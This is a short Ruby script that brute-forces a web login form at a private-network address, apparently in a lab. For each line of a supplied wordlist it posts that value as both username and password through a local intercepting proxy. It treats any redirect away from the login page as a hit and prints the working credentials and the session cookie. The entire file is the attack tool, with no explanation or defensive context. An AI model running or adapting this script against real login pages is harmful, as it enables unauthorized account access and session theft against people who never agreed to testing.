require "net/http"
require "uri"
require "pp"

#Remote host
URL = "http://192.168.88.193/login"

# Create URL
url = URI.parse(URL)

# Proxy config
PROXY = "127.0.0.1"
PROXY_PORT = "8080"

exit unless ARGV[0]

File.readlines(ARGV[0]).each do |c|
	c.chomp!
	# HTTP request
	resp = Net::HTTP::Proxy(PROXY, PROXY_PORT).start(url.host, url.port) do |http|
		resp = http.post(url.request_uri, "login=#{c}&password=#{c}")
	end

	# Print location header of the response
	puts resp.header['Location']

	# If the redirect doesn't match login
	# we probably have a winner
	if resp.header['Location'] !~ /login/
		puts "Valid credentials found: #{c}/#{c}"
		puts resp.header['Set-Cookie']
		exit
	end
end

